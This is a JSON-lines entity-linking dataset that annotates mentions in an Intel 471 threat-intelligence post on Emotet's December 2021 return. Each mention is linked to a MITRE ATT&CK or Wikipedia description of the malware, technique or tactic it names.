{"mention": "Emotet", "context_left": "How the new", "context_right": "differs from previous versions Dec 09, 2021", "_context_left": "How the new ", "_context_right": " differs from previous versions", "sentence_left": "", "sentence_right": "Dec 09, 2021", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "Dec 09, 2021 Last month, Intel 471 observed the emergence of", "context_right": ", a notorious strain of malware that had been dormant for most of 2021 after law enforcement agencies [forced it offline](https://intel471.com/blog/emotet-takedown-2021). We wrote in January that “Only time will tell if the takedown will have a long-term impact on Emotet operations.", "_context_left": "Last month, Intel 471 observed the emergence of ", "_context_right": ", a notorious strain of malware that had been dormant for most of 2021 after law enforcement agencies [forced it offline](https://intel471.com/blog/emotet-takedown-2021).", "sentence_left": "Dec 09, 2021", "sentence_right": "We wrote in January that “Only time will tell if the takedown will have a long-term impact on Emotet operations.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "malware", "context_left": "Dec 09, 2021 Last month, Intel 471 observed the emergence of Emotet, a notorious strain of", "context_right": "that had been dormant for most of 2021 after law enforcement agencies [forced it offline](https://intel471.com/blog/emotet-takedown-2021). We wrote in January that “Only time will tell if the takedown will have a long-term impact on Emotet operations.", "_context_left": "Last month, Intel 471 observed the emergence of Emotet, a notorious strain of ", "_context_right": " that had been dormant for most of 2021 after law enforcement agencies [forced it offline](https://intel471.com/blog/emotet-takedown-2021).", "sentence_left": "Dec 09, 2021", "sentence_right": "We wrote in January that “Only time will tell if the takedown will have a long-term impact on Emotet operations.", "label": "Malware (a portmanteau for malicious software) is any software intentionally designed to cause damage to a computer, server, client, or computer network. Malware does the damage after it is implanted or introduced in some way into a target's computer and can take the form of executable code, scripts, active content, and other software. The code is described as computer viruses, worms, Trojan horses, ransomware, spyware, adware, and scareware, among other terms. Malware has a malicious intent, acting against the interest of the computer user—and so does not include software that causes unintentional harm due to some deficiency, which is typically described as a software bug.  Programs officially supplied by companies can be considered malware if they secretly act against the interests of the computer user. For example, at one point Sony music Compact discs silently installed a rootkit on purchasers' computers with the intention of preventing illicit copying; but which also reported on users' listening habits, and unintentionally created extra security vulnerabilities.  One strategy for protecting against malware is to prevent the harmful software from gaining access to the target computer. For this reason, antivirus software, firewalls and other strategies are used to help protect against the introduction of malware, in addition to checking for the presence of malware and malicious activity and recovering from attacks.", "label_id": 10247, "label_title": "Malware", "label_link": "https://en.wikipedia.org/wiki?curid=20901", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "Last month, Intel 471 observed the emergence of Emotet, a notorious strain of malware that had been dormant for most of 2021 after law enforcement agencies [forced it offline](https://intel471.com/blog/emotet-takedown-2021). We wrote in January that “Only time will tell if the takedown will have a long-term impact on", "context_right": "operations. The groups who run these botnets are sophisticated and resilient, and will most likely have some sort of inherent recovery in place.", "_context_left": "We wrote in January that “Only time will tell if the takedown will have a long-term impact on ", "_context_right": " operations.", "sentence_left": "Last month, Intel 471 observed the emergence of Emotet, a notorious strain of malware that had been dormant for most of 2021 after law enforcement agencies [forced it offline](https://intel471.com/blog/emotet-takedown-2021).", "sentence_right": "The groups who run these botnets are sophisticated and resilient, and will most likely have some sort of inherent recovery in place.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "The groups who run these botnets are sophisticated and resilient, and will most likely have some sort of inherent recovery in place. While it took months to do, it looks like those behind", "context_right": "have recovered. Our initial analysis found some similarities between the new version and what was previously used.", "_context_left": "While it took months to do, it looks like those behind ", "_context_right": " have recovered.", "sentence_left": "The groups who run these botnets are sophisticated and resilient, and will most likely have some sort of inherent recovery in place.", "sentence_right": "Our initial analysis found some similarities between the new version and what was previously used.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "including the encryption used for communication,", "context_left": "Our initial analysis found some similarities between the new version and what was previously used. However, given further examination, we have found distinct differences,", "context_right": "additional commands and reconfigurations in several pieces of the communication protocol. Further investigation into Emotet’s keys and IP buffers also revealed two separate botnets are being used to distribute the malware.", "_context_left": "However, given further examination, we have found distinct differences, ", "_context_right": " additional commands and reconfigurations in several pieces of the communication protocol.", "sentence_left": "Our initial analysis found some similarities between the new version and what was previously used.", "sentence_right": "Further investigation into Emotet’s keys and IP buffers also revealed two separate botnets are being used to distribute the malware.", "label": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "label_id": 376, "label_title": "Encrypted Channel", "label_link": "https://attack.mitre.org/techniques/T1573", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "However, given further examination, we have found distinct differences, including the encryption used for communication, additional commands and reconfigurations in several pieces of the communication protocol. Further investigation into", "context_right": "’s keys and IP buffers also revealed two separate botnets are being used to distribute the malware. By searching for these differences, security teams can fine-tune their defenses to make sure this new version can be detected.", "_context_left": "Further investigation into ", "_context_right": "’s keys and IP buffers also revealed two separate botnets are being used to distribute the malware.", "sentence_left": "However, given further examination, we have found distinct differences, including the encryption used for communication, additional commands and reconfigurations in several pieces of the communication protocol.", "sentence_right": "By searching for these differences, security teams can fine-tune their defenses to make sure this new version can be detected.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "malware", "context_left": "However, given further examination, we have found distinct differences, including the encryption used for communication, additional commands and reconfigurations in several pieces of the communication protocol. Further investigation into Emotet’s keys and IP buffers also revealed two separate botnets are being used to distribute the", "context_right": ". By searching for these differences, security teams can fine-tune their defenses to make sure this new version can be detected.", "_context_left": "Further investigation into Emotet’s keys and IP buffers also revealed two separate botnets are being used to distribute the ", "_context_right": ".", "sentence_left": "However, given further examination, we have found distinct differences, including the encryption used for communication, additional commands and reconfigurations in several pieces of the communication protocol.", "sentence_right": "By searching for these differences, security teams can fine-tune their defenses to make sure this new version can be detected.", "label": "Malware (a portmanteau for malicious software) is any software intentionally designed to cause damage to a computer, server, client, or computer network. Malware does the damage after it is implanted or introduced in some way into a target's computer and can take the form of executable code, scripts, active content, and other software. The code is described as computer viruses, worms, Trojan horses, ransomware, spyware, adware, and scareware, among other terms. Malware has a malicious intent, acting against the interest of the computer user—and so does not include software that causes unintentional harm due to some deficiency, which is typically described as a software bug.  Programs officially supplied by companies can be considered malware if they secretly act against the interests of the computer user. For example, at one point Sony music Compact discs silently installed a rootkit on purchasers' computers with the intention of preventing illicit copying; but which also reported on users' listening habits, and unintentionally created extra security vulnerabilities.  One strategy for protecting against malware is to prevent the harmful software from gaining access to the target computer. For this reason, antivirus software, firewalls and other strategies are used to help protect against the introduction of malware, in addition to checking for the presence of malware and malicious activity and recovering from attacks.", "label_id": 10247, "label_title": "Malware", "label_link": "https://en.wikipedia.org/wiki?curid=20901", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "**What we already knew**", "context_right": "is a loader-focused, modular malware family that can steal credentials and emails, while also allowing users to send spam from infected users. The modules we observed included:", "_context_left": "", "_context_right": " is a loader-focused, modular malware family that can steal credentials and emails, while also allowing users to send spam from infected users.", "sentence_left": "**What we already knew**", "sentence_right": "The modules we observed included:", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "malware", "context_left": "**What we already knew** Emotet is a loader-focused, modular", "context_right": "family that can steal credentials and emails, while also allowing users to send spam from infected users. The modules we observed included:", "_context_left": "Emotet is a loader-focused, modular ", "_context_right": " family that can steal credentials and emails, while also allowing users to send spam from infected users.", "sentence_left": "**What we already knew**", "sentence_right": "The modules we observed included:", "label": "Malware (a portmanteau for malicious software) is any software intentionally designed to cause damage to a computer, server, client, or computer network. Malware does the damage after it is implanted or introduced in some way into a target's computer and can take the form of executable code, scripts, active content, and other software. The code is described as computer viruses, worms, Trojan horses, ransomware, spyware, adware, and scareware, among other terms. Malware has a malicious intent, acting against the interest of the computer user—and so does not include software that causes unintentional harm due to some deficiency, which is typically described as a software bug.  Programs officially supplied by companies can be considered malware if they secretly act against the interests of the computer user. For example, at one point Sony music Compact discs silently installed a rootkit on purchasers' computers with the intention of preventing illicit copying; but which also reported on users' listening habits, and unintentionally created extra security vulnerabilities.  One strategy for protecting against malware is to prevent the harmful software from gaining access to the target computer. For this reason, antivirus software, firewalls and other strategies are used to help protect against the introduction of malware, in addition to checking for the presence of malware and malicious activity and recovering from attacks.", "label_id": 10247, "label_title": "Malware", "label_link": "https://en.wikipedia.org/wiki?curid=20901", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "that can steal credentials and emails", "context_left": "**What we already knew** Emotet is a loader-focused, modular malware family", "context_right": ", while also allowing users to send spam from infected users. The modules we observed included:", "_context_left": "Emotet is a loader-focused, modular malware family ", "_context_right": ", while also allowing users to send spam from infected users.", "sentence_left": "**What we already knew**", "sentence_right": "The modules we observed included:", "label": "The adversary is trying to steal data. Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.", "label_id": 583, "label_title": "Exfiltration", "label_link": "https://attack.mitre.org/tactics/TA0010", "entity_class": "CI", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "A SPAM", "context_left": "The modules we observed included: *", "context_right": "module * Email credential stealer", "_context_left": "* ", "_context_right": " module", "sentence_left": "The modules we observed included:", "sentence_right": "* Email credential stealer", "label": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "label_id": 161, "label_title": "Phishing", "label_link": "https://attack.mitre.org/techniques/T1566", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "credential stealer", "context_left": "* A SPAM module * Email", "context_right": "* Outlook email address harvester", "_context_left": "* Email ", "_context_right": "", "sentence_left": "* A SPAM module", "sentence_right": "* Outlook email address harvester", "label": "The adversary is trying to steal account names and passwords. Credential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.", "label_id": 585, "label_title": "Credential Access", "label_link": "https://attack.mitre.org/tactics/TA0006", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Email credential stealer", "context_left": "* A SPAM module *", "context_right": "* Outlook email address harvester", "_context_left": "* ", "_context_right": "", "sentence_left": "* A SPAM module", "sentence_right": "* Outlook email address harvester", "label": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients.", "label_id": 567, "label_title": "Email Collection", "label_link": "https://attack.mitre.org/techniques/T1114", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Outlook email address harvester", "context_left": "* Email credential stealer *", "context_right": "* Browser credential stealer", "_context_left": "* ", "_context_right": "", "sentence_left": "* Email credential stealer", "sentence_right": "* Browser credential stealer", "label": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients.", "label_id": 567, "label_title": "Email Collection", "label_link": "https://attack.mitre.org/techniques/T1114", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Browser credential stealer", "context_left": "* Outlook email address harvester *", "context_right": "* Web-injector", "_context_left": "* ", "_context_right": "", "sentence_left": "* Outlook email address harvester", "sentence_right": "* Web-injector", "label": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access. Adversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Once forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)", "label_id": 380, "label_title": "Forge Web Credentials", "label_link": "https://attack.mitre.org/techniques/T1606", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Web-injector", "context_left": "* Browser credential stealer *", "context_right": "* A module that allowed for brute-forcing credentials and lateral movement", "_context_left": "* ", "_context_right": "", "sentence_left": "* Browser credential stealer", "sentence_right": "* A module that allowed for brute-forcing credentials and lateral movement", "label": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Multiple ways of delivering exploit code to a browser exist, including: * A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting. * Malicious ads are paid for and served through legitimate ad providers. * Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content). Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise) Typical drive-by compromise process: 1. A user visits a website that is used to host the adversary controlled content. 2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. * The user may be required to assist in this process by enabling scripting", "label_id": 15, "label_title": "Drive-by Compromise", "label_link": "https://attack.mitre.org/techniques/T1189", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "lateral movement", "context_left": "* Web-injector * A module that allowed for brute-forcing credentials and", "context_right": "In the short time that the malware has been active, Emotet has been heavily used to push malspam.", "_context_left": "* A module that allowed for brute-forcing credentials and ", "_context_right": "", "sentence_left": "* Web-injector", "sentence_right": "In the short time that the malware has been active, Emotet has been heavily used to push malspam.", "label": "The adversary is trying to move through your environment. Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.", "label_id": 580, "label_title": "Lateral Movement", "label_link": "https://attack.mitre.org/tactics/TA0008", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "brute-forcing credentials", "context_left": "* Web-injector * A module that allowed for", "context_right": "and lateral movement In the short time that the malware has been active, Emotet has been heavily used to push malspam.", "_context_left": "* A module that allowed for ", "_context_right": " and lateral movement", "sentence_left": "* Web-injector", "sentence_right": "In the short time that the malware has been active, Emotet has been heavily used to push malspam.", "label": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes. Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.", "label_id": 434, "label_title": "Brute Force", "label_link": "https://attack.mitre.org/techniques/T1110", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "malware", "context_left": "* A module that allowed for brute-forcing credentials and lateral movement In the short time that the", "context_right": "has been active, Emotet has been heavily used to push malspam. While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "_context_left": "In the short time that the ", "_context_right": " has been active, Emotet has been heavily used to push malspam.", "sentence_left": "* A module that allowed for brute-forcing credentials and lateral movement", "sentence_right": "While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "label": "Malware (a portmanteau for malicious software) is any software intentionally designed to cause damage to a computer, server, client, or computer network. Malware does the damage after it is implanted or introduced in some way into a target's computer and can take the form of executable code, scripts, active content, and other software. The code is described as computer viruses, worms, Trojan horses, ransomware, spyware, adware, and scareware, among other terms. Malware has a malicious intent, acting against the interest of the computer user—and so does not include software that causes unintentional harm due to some deficiency, which is typically described as a software bug.  Programs officially supplied by companies can be considered malware if they secretly act against the interests of the computer user. For example, at one point Sony music Compact discs silently installed a rootkit on purchasers' computers with the intention of preventing illicit copying; but which also reported on users' listening habits, and unintentionally created extra security vulnerabilities.  One strategy for protecting against malware is to prevent the harmful software from gaining access to the target computer. For this reason, antivirus software, firewalls and other strategies are used to help protect against the introduction of malware, in addition to checking for the presence of malware and malicious activity and recovering from attacks.", "label_id": 10247, "label_title": "Malware", "label_link": "https://en.wikipedia.org/wiki?curid=20901", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "* A module that allowed for brute-forcing credentials and lateral movement In the short time that the malware has been active,", "context_right": "has been heavily used to push malspam. While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "_context_left": "In the short time that the malware has been active, ", "_context_right": " has been heavily used to push malspam.", "sentence_left": "* A module that allowed for brute-forcing credentials and lateral movement", "sentence_right": "While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "push malspam", "context_left": "* A module that allowed for brute-forcing credentials and lateral movement In the short time that the malware has been active, Emotet has been heavily used to", "context_right": ". While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "_context_left": "In the short time that the malware has been active, Emotet has been heavily used to ", "_context_right": ".", "sentence_left": "* A module that allowed for brute-forcing credentials and lateral movement", "sentence_right": "While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "label": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "label_id": 161, "label_title": "Phishing", "label_link": "https://attack.mitre.org/techniques/T1566", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Malware", "context_left": "In the short time that the malware has been active, Emotet has been heavily used to push malspam. While Intel 471", "context_right": "Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used. Emotet emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.", "_context_left": "While Intel 471 ", "_context_right": " Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "sentence_left": "In the short time that the malware has been active, Emotet has been heavily used to push malspam.", "sentence_right": "Emotet emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.", "label": "Malware (a portmanteau for malicious software) is any software intentionally designed to cause damage to a computer, server, client, or computer network. Malware does the damage after it is implanted or introduced in some way into a target's computer and can take the form of executable code, scripts, active content, and other software. The code is described as computer viruses, worms, Trojan horses, ransomware, spyware, adware, and scareware, among other terms. Malware has a malicious intent, acting against the interest of the computer user—and so does not include software that causes unintentional harm due to some deficiency, which is typically described as a software bug.  Programs officially supplied by companies can be considered malware if they secretly act against the interests of the computer user. For example, at one point Sony music Compact discs silently installed a rootkit on purchasers' computers with the intention of preventing illicit copying; but which also reported on users' listening habits, and unintentionally created extra security vulnerabilities.  One strategy for protecting against malware is to prevent the harmful software from gaining access to the target computer. For this reason, antivirus software, firewalls and other strategies are used to help protect against the introduction of malware, in addition to checking for the presence of malware and malicious activity and recovering from attacks.", "label_id": 10247, "label_title": "Malware", "label_link": "https://en.wikipedia.org/wiki?curid=20901", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "In the short time that the malware has been active, Emotet has been heavily used to push malspam. While Intel 471 Malware Intelligence systems were unable to collect any malspam from", "context_right": ", open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used. Emotet emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.", "_context_left": "While Intel 471 Malware Intelligence systems were unable to collect any malspam from ", "_context_right": ", open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "sentence_left": "In the short time that the malware has been active, Emotet has been heavily used to push malspam.", "sentence_right": "Emotet emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "VirusTotal", "context_left": "In the short time that the malware has been active, Emotet has been heavily used to push malspam. While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the", "context_right": "intelligence platform, demonstrate the spam templates used. Emotet emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.", "_context_left": "While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the ", "_context_right": " intelligence platform, demonstrate the spam templates used.", "sentence_left": "In the short time that the malware has been active, Emotet has been heavily used to push malspam.", "sentence_right": "Emotet emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.", "label": "VirusTotal is a website created by the Spanish security company Hispasec Sistemas. Launched in June 2004, it was acquired by Google Inc. in September 2012. The company's ownership switched in January 2018 to Chronicle, a subsidiary of Alphabet Inc..  VirusTotal aggregates many antivirus products and online scan engines to check for viruses that the user's own antivirus may have missed, or to verify against any false positives. Files up to 550 MB can be uploaded to the website or sent via email. Anti-virus software vendors can receive copies of files that were flagged by other scans but passed by their own engine, to help improve their software and, by extension, VirusTotal's own capability. Users can also scan suspect URLs and search through the VirusTotal dataset. VirusTotal for dynamic analysis of malware uses Cuckoo sandbox. VirusTotal was selected by \"PC World\" as one of the best 100 products of 2007.", "label_id": 2031721, "label_title": "VirusTotal", "label_link": "https://en.wikipedia.org/wiki?curid=15472369", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "context_right": "emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file. ![Image 1 email lure]()", "_context_left": "", "_context_right": " emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.", "sentence_left": "While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "sentence_right": "![Image 1 email lure]()", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
